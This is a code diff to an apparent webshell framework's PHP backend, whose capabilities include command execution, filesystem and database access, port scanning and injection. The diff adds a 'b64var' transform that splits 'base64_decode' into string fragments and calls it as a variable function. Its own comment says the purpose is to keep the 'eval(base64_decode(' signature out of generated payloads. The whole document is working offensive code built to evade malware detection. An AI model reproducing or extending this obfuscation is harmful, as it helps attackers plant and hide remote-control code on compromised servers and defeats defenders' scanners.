@@ -33,7 +33,7 @@ class PHPBackend(Backend):
     capabilities = frozenset(
         {"command", "fs", "mysql", "pgsql", "portscan", "inject", "mount"}
     )
-    supported_transforms = frozenset({"base64", "gzip", "xor"})
+    supported_transforms = frozenset({"base64", "b64var", "gzip", "xor"})
 
     def literal(self, value: str) -> str:
         return f"base64_decode('{base64.b64encode(value.encode()).decode()}')"
@@ -41,6 +41,14 @@ class PHPBackend(Backend):
     def wrap_eval(self, payload: EncodedPayload) -> str:
         if payload.name == "base64":
             return f"eval(base64_decode('{payload.b64}'));"
+        if payload.name == "b64var":
+            # Build `base64_decode` from fragments and call it as a *variable
+            # function*, so neither `base64_decode(` nor the combined
+            # `eval(base64_decode(` signature appears literally. (`eval` is a
+            # language construct and can't be called indirectly, so it stays —
+            # but a bare `eval(` is far less signature-worthy.)
+            var_d = f"v{random_string(5)}"
+            return f"${var_d}='bas'.'e64_de'.'code';eval(${var_d}('{payload.b64}'));"
         if payload.name == "gzip":
             return f"eval(gzinflate(base64_decode('{payload.b64}')));"
         if payload.name == "xor":
